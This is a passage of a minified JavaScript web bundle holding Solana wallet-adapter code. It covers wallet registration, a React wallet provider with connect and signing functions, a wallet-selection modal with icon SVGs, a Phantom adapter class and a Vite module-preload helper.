array"),Tr;const{register:e}=Tr,t=(...r)=>r.forEach(i=>ry(()=>i({register:e})));try{Object.defineProperty(window.navigator,"wallets",{value:Object.freeze({push:t})})}catch{return console.error("window.navigator.wallets could not be set"),Tr}return t(...n),Tr}function $6(n){const e=XE(()=>new Set),{get:t,on:r}=XE(()=>W6()),[i,s]=Y.useState(()=>eI(t()));Y.useEffect(()=>{const a=[r("register",(...l)=>s(u=>[...u,...eI(l)])),r("unregister",(...l)=>s(u=>u.filter(h=>l.some(f=>f===h.wallet))))];return()=>a.forEach(l=>l())},[r]);const o=H6(i);return Y.useEffect(()=>{if(!o)return;const a=new Set(i);new Set(o.filter(u=>!a.has(u))).forEach(u=>u.destroy())},[o,i]),Y.useEffect(()=>()=>i.forEach(a=>a.destroy()),[]),Y.useMemo(()=>[...i,...n.filter(({name:a})=>i.some(l=>l.name===a)?(e.has(a)||(e.add(a),console.warn(`${a} was registered as a Standard Wallet. The Wallet Adapter for ${a} can be removed from your app.`)),!1):!0)],[i,n,e])}function XE(n){const e=Y.useRef(void 0);return e.current===void 0&&(e.current={value:n()}),e.current.value}function H6(n){const e=Y.useRef(void 0);return Y.useEffect(()=>{e.current=n}),e.current}function eI(n){return n.filter(L6).map(e=>new P6({wallet:e}))}var Il;(function(n){n[n.DESKTOP_WEB=0]="DESKTOP_WEB",n[n.MOBILE_WEB=1]="MOBILE_WEB"})(Il||(Il={}));function q6(n){return/(WebView|Version\/.+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+)|; wv\).+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+))/i.test(n)}function K6({adapters:n,userAgentString:e}){return n.some(t=>t.name!==hu&&t.readyState===Ve.Installed)?Il.DESKTOP_WEB:e&&/android/i.test(e)&&!q6(e)?Il.MOBILE_WEB:Il.DESKTOP_WEB}function G6(n){return n?/devnet/i.test(n)?"devnet":/testnet/i.test(n)?"testnet":"mainnet-beta":"mainnet-beta"}function Q6({children:n,wallets:e,adapter:t,isUnloadingRef:r,onAutoConnectRequest:i,onConnectError:s,onError:o,onSelectWallet:a}){const l=Y.useRef(!1),[u,h]=Y.useState(!1),f=Y.useRef(!1),[p,w]=Y.useState(!1),[x,k]=Y.useState(()=>(t==null?void 0:t.publicKey)??null),[I,A]=Y.useState(()=>(t==null?void 0:t.connected)??!1),b=Y.useRef(o);Y.useEffect(()=>(b.current=o,()=>{b.current=void 0}),[o]);const E=Y.useRef((_,C)=>(r.current||(b.current?b.current(_,C):(console.error(_,C),_ instanceof so&&typeof window<"u"&&C&&window.open(C.url,"_blank"))),_)),[O,W]=Y.useState(()=>e.map(_=>({adapter:_,readyState:_.readyState})).filter(({readyState:_})=>_!==Ve.Unsupported));Y.useEffect(()=>{W(C=>e.map((M,R)=>{const j=C[R];return j&&j.adapter===M&&j.readyState===M.readyState?j:{adapter:M,readyState:M.readyState}}).filter(({readyState:M})=>M!==Ve.Unsupported));function _(C){W(M=>{const R=M.findIndex(({adapter:H})=>H===this);if(R===-1)return M;const{adapter:j}=M[R];return[...M.slice(0,R),{adapter:j,readyState:C},...M.slice(R+1)].filter(({readyState:H})=>H!==Ve.Unsupported)})}return e.forEach(C=>C.on("readyStateChange",_,C)),()=>{e.forEach(C=>C.off("readyStateChange",_,C))}},[t,e]);const q=Y.useMemo(()=>O.find(_=>_.adapter===t)??null,[t,O]);Y.useEffect(()=>{if(!t)return;const _=R=>{k(R),l.current=!1,h(!1),A(!0),f.current=!1,w(!1)},C=()=>{r.current||(k(null),l.current=!1,h(!1),A(!1),f.current=!1,w(!1))},M=R=>{E.current(R,t)};return t.on("connect",_),t.on("disconnect",C),t.on("error",M),()=>{t.off("connect",_),t.off("disconnect",C),t.off("error",M),C()}},[t,r]);const L=Y.useRef(!1);Y.useEffect(()=>()=>{L.current=!1},[t]),Y.useEffect(()=>{L.current||l.current||I||!i||!((q==null?void 0:q.readyState)===Ve.Installed||(q==null?void 0:q.readyState)===Ve.Loadable)||(l.current=!0,h(!0),L.current=!0,async function(){try{await i()}catch{s()}finally{h(!1),l.current=!1}}())},[I,i,s,q]);const N=Y.useCallback(async(_,C,M)=>{if(!t)throw E.current(new UE);if(!I)throw E.current(new sn,t);return await t.sendTransaction(_,C,M)},[t,I]),B=Y.useMemo(()=>t&&"signTransaction"in t?async _=>{if(!I)throw E.current(new sn,t);return await t.signTransaction(_)}:void 0,[t,I]),z=Y.useMemo(()=>t&&"signAllTransactions"in t?async _=>{if(!I)throw E.current(new sn,t);return await t.signAllTransactions(_)}:void 0,[t,I]),$=Y.useMemo(()=>t&&"signMessage"in t?async _=>{if(!I)throw E.current(new sn,t);return await t.signMessage(_)}:void 0,[t,I]),K=Y.useMemo(()=>t&&"signIn"in t?async _=>await t.signIn(_):void 0,[t]),S=Y.useCallback(async()=>{if(l.current||f.current||q!=null&&q.adapter.connected)return;if(!q)throw E.current(new UE);const{adapter:_,readyState:C}=q;if(!(C===Ve.Installed||C===Ve.Loadable))throw E.current(new so,_);l.current=!0,h(!0);try{await _.connect()}catch(M){throw s(),M}finally{h(!1),l.current=!1}},[s,q]),d=Y.useCallback(async()=>{if(!f.current&&t){f.current=!0,w(!0);try{await t.disconnect()}finally{w(!1),f.current=!1}}},[t]);return ae.createElement(Ax.Provider,{value:{autoConnect:!!i,wallets:O,wallet:q,publicKey:x,connected:I,connecting:u,disconnecting:p,select:a,connect:S,disconnect:d,sendTransaction:N,signTransaction:B,signAllTransactions:z,signMessage:$,signIn:K}},n)}let Am;function Y6(){var n;return Am===void 0&&(Am=((n=globalThis.navigator)==null?void 0:n.userAgent)??null),Am}function tI(n){const e=Y6();return K6({adapters:n,userAgentString:e})===Il.MOBILE_WEB}function Z6(){const n=globalThis.location;if(n)return`${n.protocol}//${n.host}`}function J6({children:n,wallets:e,autoConnect:t,localStorageKey:r="walletName",onError:i}){const{connection:s}=M3(),o=$6(e),a=Y.useMemo(()=>{if(!tI(o))return null;const b=o.find(E=>E.name===hu);return b||new E6({addressSelector:I6(),appIdentity:{uri:Z6()},authorizationResultCache:S6(),cluster:G6(s==null?void 0:s.rpcEndpoint),onWalletNotFound:A6()})},[o,s==null?void 0:s.rpcEndpoint]),l=Y.useMemo(()=>a==null||o.indexOf(a)!==-1?o:[a,...o],[o,a]),[u,h]=V3(r,null),f=Y.useMemo(()=>l.find(b=>b.name===u)??null,[l,u]),p=Y.useCallback(b=>{u!==b&&(f&&f.name!==hu&&f.disconnect(),h(b))},[f,h,u]);Y.useEffect(()=>{if(!f)return;function b(){k.current||h(null)}return f.on("disconnect",b),()=>{f.off("disconnect",b)}},[f,o,h,u]);const w=Y.useRef(!1),x=Y.useMemo(()=>{if(!(!t||!f))return async()=>{(t===!0||await t(f))&&(w.current?await f.connect():await f.autoConnect())}},[t,f]),k=Y.useRef(!1);Y.useEffect(()=>{if(u===hu&&tI(o)){k.current=!1;return}function b(){k.current=!0}return window.addEventListener("beforeunload",b),()=>{window.removeEventListener("beforeunload",b)}},[o,u]);const I=Y.useCallback(()=>{f&&p(null)},[f,p]),A=Y.useCallback(b=>{w.current=!0,p(b)},[p]);return ae.createElement(Q6,{wallets:l,adapter:f,isUnloadingRef:k,onAutoConnectRequest:x,onConnectError:I,onError:i,onSelectWallet:A},n)}const Zx={setVisible(n){console.error(Jx("call","setVisible"))},visible:!1};Object.defineProperty(Zx,"visible",{get(){return console.error(Jx("read","visible")),!1}});function Jx(n,e){return`You have tried to  ${n} "${e}" on a WalletModalContext without providing one. Make sure to render a WalletModalProvider as an ancestor of the component that uses WalletModalContext`}const Xx=Y.createContext(Zx);function e2(){return Y.useContext(Xx)}function X6({onSelectWallet:n}){const{connect:e,connected:t,connecting:r,disconnect:i,disconnecting:s,publicKey:o,select:a,wallet:l,wallets:u}=cc();let h;r?h="connecting":t?h="connected":s?h="disconnecting":l?h="has-wallet":h="no-wallet";const f=Y.useCallback(()=>{e().catch(()=>{})},[e]),p=Y.useCallback(()=>{i().catch(()=>{})},[i]),w=Y.useCallback(()=>{n({onSelectWallet:a,wallets:u})},[n,a,u]);return{buttonState:h,onConnect:h==="has-wallet"?f:void 0,onDisconnect:h!=="disconnecting"&&h!=="no-wallet"?p:void 0,onSelectWallet:w,publicKey:o??void 0,walletIcon:l==null?void 0:l.adapter.icon,walletName:l==null?void 0:l.adapter.name}}const t2=n=>ae.createElement("button",{className:`wallet-adapter-button ${n.className||""}`,disabled:n.disabled,style:n.style,onClick:n.onClick,tabIndex:n.tabIndex||0,type:"button"},n.startIcon&&ae.createElement("i",{className:"wallet-adapter-button-start-icon"},n.startIcon),n.children,n.endIcon&&ae.createElement("i",{className:"wallet-adapter-button-end-icon"},n.endIcon)),n2=({wallet:n,...e})=>n&&ae.createElement("img",{src:n.adapter.icon,alt:`${n.adapter.name} icon`,...e});function e5({walletIcon:n,walletName:e,...t}){return ae.createElement(t2,{...t,className:"wallet-adapter-button-trigger",startIcon:n&&e?ae.createElement(n2,{wallet:{adapter:{icon:n,name:e}}}):void 0})}function t5({children:n,labels:e,...t}){const{setVisible:r}=e2(),{buttonState:i,onConnect:s,onDisconnect:o,publicKey:a,walletIcon:l,walletName:u}=X6({onSelectWallet(){r(!0)}}),[h,f]=Y.useState(!1),[p,w]=Y.useState(!1),x=Y.useRef(null);Y.useEffect(()=>{const I=A=>{const b=x.current;!b||b.contains(A.target)||w(!1)};return document.addEventListener("mousedown",I),document.addEventListener("touchstart",I),()=>{document.removeEventListener("mousedown",I),document.removeEventListener("touchstart",I)}},[]);const k=Y.useMemo(()=>{if(n)return n;if(a){const I=a.toBase58();return I.slice(0,4)+".."+I.slice(-4)}else return i==="connecting"||i==="has-wallet"?e[i]:e["no-wallet"]},[i,n,e,a]);return ae.createElement("div",{className:"wallet-adapter-dropdown"},ae.createElement(e5,{...t,"aria-expanded":p,style:{pointerEvents:p?"none":"auto",...t.style},onClick:()=>{switch(i){case"no-wallet":r(!0);break;case"has-wallet":s&&s();break;case"connected":w(!0);break}},walletIcon:l,walletName:u},k),ae.createElement("ul",{"aria-label":"dropdown-list",className:`wallet-adapter-dropdown-list ${p&&"wallet-adapter-dropdown-list-active"}`,ref:x,role:"menu"},a?ae.createElement("li",{className:"wallet-adapter-dropdown-list-item",onClick:async()=>{await navigator.clipboard.writeText(a.toBase58()),f(!0),setTimeout(()=>f(!1),400)},role:"menuitem"},h?e.copied:e["copy-address"]):null,ae.createElement("li",{className:"wallet-adapter-dropdown-list-item",onClick:()=>{r(!0),w(!1)},role:"menuitem"},e["change-wallet"]),o?ae.createElement("li",{className:"wallet-adapter-dropdown-list-item",onClick:()=>{o(),w(!1)},role:"menuitem"},e.disconnect):null))}const nI=({id:n,children:e,expanded:t=!1})=>{const r=Y.useRef(null),i=Y.useRef(!0),s="height 250ms ease-out",o=()=>{const l=r.current;l&&requestAnimationFrame(()=>{l.style.height=l.scrollHeight+"px"})},a=()=>{const l=r.current;l&&requestAnimationFrame(()=>{l.style.height=l.offsetHeight+"px",l.style.overflow="hidden",requestAnimationFrame(()=>{l.style.height="0"})})};return Y.useLayoutEffect(()=>{t?o():a()},[t]),Y.useLayoutEffect(()=>{const l=r.current;if(!l)return;function u(){l&&(l.style.overflow=t?"initial":"hidden",t&&(l.style.height="auto"))}function h(f){l&&f.target===l&&f.propertyName==="height"&&u()}return i.current&&(u(),i.current=!1),l.addEventListener("transitionend",h),()=>l.removeEventListener("transitionend",h)},[t]),ae.createElement("div",{className:"wallet-adapter-collapse",id:n,ref:r,role:"region",style:{height:0,transition:i.current?void 0:s}},e)},bm=({handleClick:n,tabIndex:e,wallet:t})=>ae.createElement("li",null,ae.createElement(t2,{onClick:n,startIcon:ae.createElement(n2,{wallet:t}),tabIndex:e},t.adapter.name,t.readyState===Ve.Installed&&ae.createElement("span",null,"Detected"))),n5=()=>ae.createElement("svg",{width:"97",height:"96",viewBox:"0 0 97 96",fill:"none",xmlns:"http://www.w3.org/2000/svg"},ae.createElement("circle",{cx:"48.5",cy:"48",r:"48",fill:"url(#paint0_linear_880_5115)",fillOpacity:"0.1"}),ae.createElement("circle",{cx:"48.5",cy:"48",r:"47",stroke:"url(#paint1_linear_880_5115)",strokeOpacity:"0.4",strokeWidth:"2"}),ae.createElement("g",{clipPath:"url(#clip0_880_5115)"},ae.createElement("path",{d:"M65.5769 28.1523H31.4231C27.6057 28.1523 24.5 31.258 24.5 35.0754V60.9215C24.5 64.7389 27.6057 67.8446 31.4231 67.8446H65.5769C69.3943 67.8446 72.5 64.7389 72.5 60.9215V35.0754C72.5 31.258 69.3943 28.1523 65.5769 28.1523ZM69.7308 52.1523H59.5769C57.2865 52.1523 55.4231 50.289 55.4231 47.9985C55.4231 45.708 57.2864 43.8446 59.5769 43.8446H69.7308V52.1523ZM69.7308 41.0754H59.5769C55.7595 41.0754 52.6539 44.1811 52.6539 47.9985C52.6539 51.8159 55.7595 54.9215 59.5769 54.9215H69.7308V60.9215C69.7308 63.2119 67.8674 65.0754 65.5769 65.0754H31.4231C29.1327 65.0754 27.2692 63.212 27.2692 60.9215V35.0754C27.2692 32.785 29.1326 30.9215 31.4231 30.9215H65.5769C67.8673 30.9215 69.7308 32.7849 69.7308 35.0754V41.0754Z",fill:"url(#paint2_linear_880_5115)"}),ae.createElement("path",{d:"M61.4231 46.6172H59.577C58.8123 46.6172 58.1924 47.2371 58.1924 48.0018C58.1924 48.7665 58.8123 49.3863 59.577 49.3863H61.4231C62.1878 49.3863 62.8077 48.7664 62.8077 48.0018C62.8077 47.2371 62.1878 46.6172 61.4231 46.6172Z",fill:"url(#paint3_linear_880_5115)"})),ae.createElement("defs",null,ae.createElement("linearGradient",{id:"paint0_linear_880_5115",x1:"3.41664",y1:"98.0933",x2:"103.05",y2:"8.42498",gradientUnits:"userSpaceOnUse"},ae.createElement("stop",{stopColor:"#9945FF"}),ae.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ae.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ae.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ae.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ae.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ae.createElement("linearGradient",{id:"paint1_linear_880_5115",x1:"3.41664",y1:"98.0933",x2:"103.05",y2:"8.42498",gradientUnits:"userSpaceOnUse"},ae.createElement("stop",{stopColor:"#9945FF"}),ae.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ae.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ae.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ae.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ae.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ae.createElement("linearGradient",{id:"paint2_linear_880_5115",x1:"25.9583",y1:"68.7101",x2:"67.2337",y2:"23.7879",gradientUnits:"userSpaceOnUse"},ae.createElement("stop",{stopColor:"#9945FF"}),ae.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ae.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ae.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ae.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ae.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ae.createElement("linearGradient",{id:"paint3_linear_880_5115",x1:"58.3326",y1:"49.4467",x2:"61.0002",y2:"45.4453",gradientUnits:"userSpaceOnUse"},ae.createElement("stop",{stopColor:"#9945FF"}),ae.createElement("stop",{offset:"0.14",stopColor:"#8A53F4"}),ae.createElement("stop",{offset:"0.42",stopColor:"#6377D6"}),ae.createElement("stop",{offset:"0.79",stopColor:"#24B0A7"}),ae.createElement("stop",{offset:"0.99",stopColor:"#00D18C"}),ae.createElement("stop",{offset:"1",stopColor:"#00D18C"})),ae.createElement("clipPath",{id:"clip0_880_5115"},ae.createElement("rect",{width:"48",height:"48",fill:"white",transform:"translate(24.5 24)"})))),r5=({className:n="",container:e="body"})=>{const t=Y.useRef(null),{wallets:r,select:i}=cc(),{setVisible:s}=e2(),[o,a]=Y.useState(!1),[l,u]=Y.useState(!1),[h,f]=Y.useState(null),[p,w]=Y.useMemo(()=>{const E=[],O=[];for(const W of r)W.readyState===Ve.Installed?E.push(W):O.push(W);return E.length?[E,O]:[O,[]]},[r]),x=Y.useCallback(()=>{u(!1),setTimeout(()=>s(!1),150)},[s]),k=Y.useCallback(E=>{E.preventDefault(),x()},[x]),I=Y.useCallback((E,O)=>{i(O),k(E)},[i,k]),A=Y.useCallback(()=>a(!o),[o]),b=Y.useCallback(E=>{const O=t.current;if(!O)return;const W=O.querySelectorAll("button"),q=W[0],L=W[W.length-1];E.shiftKey?document.activeElement===q&&(L.focus(),E.preventDefault()):document.activeElement===L&&(q.focus(),E.preventDefault())},[t]);return Y.useLayoutEffect(()=>{const E=W=>{W.key==="Escape"?x():W.key==="Tab"&&b(W)},{overflow:O}=window.getComputedStyle(document.body);return setTimeout(()=>u(!0),0),document.body.style.overflow="hidden",window.addEventListener("keydown",E,!1),()=>{document.body.style.overflow=O,window.removeEventListener("keydown",E,!1)}},[x,b]),Y.useLayoutEffect(()=>f(document.querySelector(e)),[e]),h&&$A.createPortal(ae.createElement("div",{"aria-labelledby":"wallet-adapter-modal-title","aria-modal":"true",className:`wallet-adapter-modal ${l&&"wallet-adapter-modal-fade-in"} ${n}`,ref:t,role:"dialog"},ae.createElement("div",{className:"wallet-adapter-modal-container"},ae.createElement("div",{className:"wallet-adapter-modal-wrapper"},ae.createElement("button",{onClick:k,className:"wallet-adapter-modal-button-close"},ae.createElement("svg",{width:"14",height:"14"},ae.createElement("path",{d:"M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"}))),p.length?ae.createElement(ae.Fragment,null,ae.createElement("h1",{className:"wallet-adapter-modal-title"},"Connect a wallet on Solana to continue"),ae.createElement("ul",{className:"wallet-adapter-modal-list"},p.map(E=>ae.createElement(bm,{key:E.adapter.name,handleClick:O=>I(O,E.adapter.name),wallet:E})),w.length?ae.createElement(nI,{expanded:o,id:"wallet-adapter-modal-collapse"},w.map(E=>ae.createElement(bm,{key:E.adapter.name,handleClick:O=>I(O,E.adapter.name),tabIndex:o?0:-1,wallet:E}))):null),w.length?ae.createElement("button",{className:"wallet-adapter-modal-list-more",onClick:A,tabIndex:0},ae.createElement("span",null,o?"Less ":"More ","options"),ae.createElement("svg",{width:"13",height:"7",viewBox:"0 0 13 7",xmlns:"http://www.w3.org/2000/svg",className:`${o?"wallet-adapter-modal-list-more-icon-rotate":""}`},ae.createElement("path",{d:"M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"}))):null):ae.createElement(ae.Fragment,null,ae.createElement("h1",{className:"wallet-adapter-modal-title"},"You'll need a wallet on Solana to continue"),ae.createElement("div",{className:"wallet-adapter-modal-middle"},ae.createElement(n5,null)),w.length?ae.createElement(ae.Fragment,null,ae.createElement("button",{className:"wallet-adapter-modal-list-more",onClick:A,tabIndex:0},ae.createElement("span",null,o?"Hide ":"Already have a wallet? View ","options"),ae.createElement("svg",{width:"13",height:"7",viewBox:"0 0 13 7",xmlns:"http://www.w3.org/2000/svg",className:`${o?"wallet-adapter-modal-list-more-icon-rotate":""}`},ae.createElement("path",{d:"M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"}))),ae.createElement(nI,{expanded:o,id:"wallet-adapter-modal-collapse"},ae.createElement("ul",{className:"wallet-adapter-modal-list"},w.map(E=>ae.createElement(bm,{key:E.adapter.name,handleClick:O=>I(O,E.adapter.name),tabIndex:o?0:-1,wallet:E}))))):null))),ae.createElement("div",{className:"wallet-adapter-modal-overlay",onMouseDown:k})),h)},i5=({children:n,...e})=>{const[t,r]=Y.useState(!1);return ae.createElement(Xx.Provider,{value:{visible:t,setVisible:r}},n,t&&ae.createElement(r5,{...e}))},s5={"change-wallet":"Change wallet",connecting:"Connecting ...","copy-address":"Copy address",copied:"Copied",disconnect:"Disconnect","has-wallet":"Connect","no-wallet":"Select Wallet"};function o5(n){return ae.createElement(t5,{...n,labels:s5})}const a5="Phantom";class l5 extends dv{constructor(e={}){super(),this.name=a5,this.url="https://phantom.app",this.icon="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiB2aWV3Qm94PSIwIDAgMTA4IDEwOCIgZmlsbD0ibm9uZSI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPg==",this.supportedTransactionVersions=new Set(["legacy",0]),this._readyState=typeof window>"u"||typeof document>"u"?Ve.Unsupported:Ve.NotDetected,this._disconnected=()=>{const t=this._wallet;t&&(t.off("disconnect",this._disconnected),t.off("accountChanged",this._accountChanged),this._wallet=null,this._publicKey=null,this.emit("error",new Op),this.emit("disconnect"))},this._accountChanged=t=>{const r=this._publicKey;if(r){try{t=new Se(t.toBytes())}catch(i){this.emit("error",new Vl(i==null?void 0:i.message,i));return}r.equals(t)||(this._publicKey=t,this.emit("connect",t))}},this._connecting=!1,this._wallet=null,this._publicKey=null,this._readyState!==Ve.Unsupported&&(q0()?(this._readyState=Ve.Loadable,this.emit("readyStateChange",this._readyState)):Tx(()=>{var t,r,i;return(r=(t=window.phantom)==null?void 0:t.solana)!=null&&r.isPhantom||(i=window.solana)!=null&&i.isPhantom?(this._readyState=Ve.Installed,this.emit("readyStateChange",this._readyState),!0):!1}))}get publicKey(){return this._publicKey}get connecting(){return this._connecting}get readyState(){return this._readyState}async autoConnect(){this.readyState===Ve.Installed&&await this.connect()}async connect(){var e;try{if(this.connected||this.connecting)return;if(this.readyState===Ve.Loadable){const i=encodeURIComponent(window.location.href),s=encodeURIComponent(window.location.origin);window.location.href=`https://phantom.app/ul/browse/${i}?ref=${s}`;return}if(this.readyState!==Ve.Installed)throw new so;this._connecting=!0;const t=((e=window.phantom)==null?void 0:e.solana)||window.solana;if(!t.isConnected)try{await t.connect()}catch(i){throw new qs(i==null?void 0:i.message,i)}if(!t.publicKey)throw new Ko;let r;try{r=new Se(t.publicKey.toBytes())}catch(i){throw new Vl(i==null?void 0:i.message,i)}t.on("disconnect",this._disconnected),t.on("accountChanged",this._accountChanged),this._wallet=t,this._publicKey=r,this.emit("connect",r)}catch(t){throw this.emit("error",t),t}finally{this._connecting=!1}}async disconnect(){const e=this._wallet;if(e){e.off("disconnect",this._disconnected),e.off("accountChanged",this._accountChanged),this._wallet=null,this._publicKey=null;try{await e.disconnect()}catch(t){this.emit("error",new fv(t==null?void 0:t.message,t))}}this.emit("disconnect")}async sendTransaction(e,t,r={}){try{const i=this._wallet;if(!i)throw new sn;try{const{signers:s,...o}=r;ts(e)?s!=null&&s.length&&e.sign(s):(e=await this.prepareTransaction(e,t,o),s!=null&&s.length&&e.partialSign(...s)),o.preflightCommitment=o.preflightCommitment||t.commitment;const{signature:a}=await i.signAndSendTransaction(e,o);return a}catch(s){throw s instanceof kn?s:new es(s==null?void 0:s.message,s)}}catch(i){throw this.emit("error",i),i}}async signTransaction(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signTransaction(e)||e}catch(r){throw new ai(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signAllTransactions(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signAllTransactions(e)||e}catch(r){throw new ai(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signMessage(e){try{const t=this._wallet;if(!t)throw new sn;try{const{signature:r}=await t.signMessage(e);return r}catch(r){throw new Bp(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}}const c5="modulepreload",u5=function(n,e){return new URL(n,e).href},rI={},r2=function(e,t,r){if(!t||t.length===0)return e();const i=document.getElementsByTagName("link");return Promise.all(t.map(s=>{if(s=u5(s,r),s in rI)return;rI[s]=!0;const o=s.endsWith(".css"),a=o?'[rel="stylesheet"]':"";if(!!r)for(let h=i.length-1;h>=0;h--){const f=i[h];if(f.href===s&&(!o||f.rel==="stylesheet"))return}else if(document.querySelector(`link[href="${s}"]${a}`))return;const u=document.createElement("link");if(u.rel=o?"stylesheet":c5,o||(u.as="script",u.crossOrigin=""),u.href=s,document.head.appendChild(u),o)return new Promise((h,f)=>{u.addEventListener("load",h),u.addEventListener("error",()=>f(new Error(`Unable to preload CSS for ${s}`)))})})).then(()=>e()).catch(s=>{const o=new Event("vite:preloadError",{cancelable:!0});if(o.payload=s,window.dispatchEvent(o),!o.defaultPrevented)throw s})},h5="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjMxIiB2aWV3Qm94PSIwIDAgMzEgMzEiIHdpZHRoPSIzMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjIwLjI1IiB4Mj0iMjYuNTcxIiB5MT0iMjcuMTczIiB5Mj0iMTkuODU4Ij48c3RvcCBvZmZzZXQ9Ii4wOCIgc3RvcC1jb2xvcj0iIzk5NDVmZiIvPjxzdG9wIG9mZnNldD0iLjMiIHN0b3AtY29sb3I9IiM4NzUyZjMiLz48c3RvcCBvZmZzZXQ9Ii41IiBzdG9wLWNvbG9yPSIjNTQ5N2Q1Ii8+PHN0b3Agb2Zmc2V0PSIuNiIgc3RvcC1jb2xvcj0iIzQzYjRjYSIvPjxzdG9wIG9mZnNldD0iLjcyIiBzdG9wLWNvbG9yPSIjMjhlMGI5Ii8+PHN0b3Agb2Zmc2V0PSIuOTciIHN0b3AtY29sb3I9IiMxOWZiOWIiLz48L2xpbmVhckdyYWRpZW50PjxnIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS13aWR0aD0iLjA5NCI+PHBhdGggZD0ibTI2LjEwOSAzLjY0My05LjM2OSA2Ljk1OSAxLjczMy00LjEwNSA3LjYzNy0yLjg1M3oiIGZpbGw9IiNlMjc2MWIiIHN0cm9rZT0iI2UyNzYxYiIvPjxnIGZpbGw9IiNlNDc2MWIiIHN0cm9rZT0iI2U0NzYxYiI+PHBhdGggZD0ibTQuNDgxIDMuNjQzIDkuMjk0IDc